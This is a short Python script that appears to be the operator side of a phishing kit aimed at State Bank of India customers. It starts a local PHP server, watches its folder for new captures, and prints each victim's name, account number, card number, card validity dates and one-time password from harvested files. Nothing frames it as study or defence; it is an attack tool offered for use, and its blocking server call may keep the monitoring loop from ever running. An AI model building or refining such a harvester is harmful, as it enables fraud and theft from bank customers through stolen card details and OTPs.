import os
from trackdir import track_changes

def extract_data_from_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return file.readlines()
    except FileNotFoundError:
        print(f"File not found: {file_name}")
        return []

def parse_data(data_lines):
    data_dict = {}
    for line in data_lines:
        if line.strip():
            key, value = line.split(': ', 1)
            data_dict[key.strip()] = value.strip()
    return data_dict

def print_data():
    data_info = parse_data(extract_data_from_file("data.txt"))
    otp_info = parse_data(extract_data_from_file("otp.txt"))
    os.system('cls' if os.name == 'nt' else 'clear')
    
    green = "\033[92m"
    red = "\033[91m"
    
    print(f"{green}SBI Information:{red}")
    print(f"{green} [{red}+{green}] {red}Your Name{red}: {green}{data_info.get('Name', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}Account Number{red}: {green}{data_info.get('Account Number', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}Card Number{red}: {green}{data_info.get('Card Number', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}Valid From{red}: {green}{data_info.get('Valid From', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}Valid Upto{red}: {green}{data_info.get('Valid Upto', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}OTP is{red}: {green}{otp_info.get('OTP', 'N/A')}")

if __name__ == "__main__":
    os.system("php -S 127.0.0.1:8080")
    directory_to_monitor = os.getcwd()

    while True:
        change = track_changes(directory_to_monitor)
        if change:
            event_type = change["type"]
            event_path = change["path"]
            print(f"Detected {event_type} at {event_path}")
            print_data()
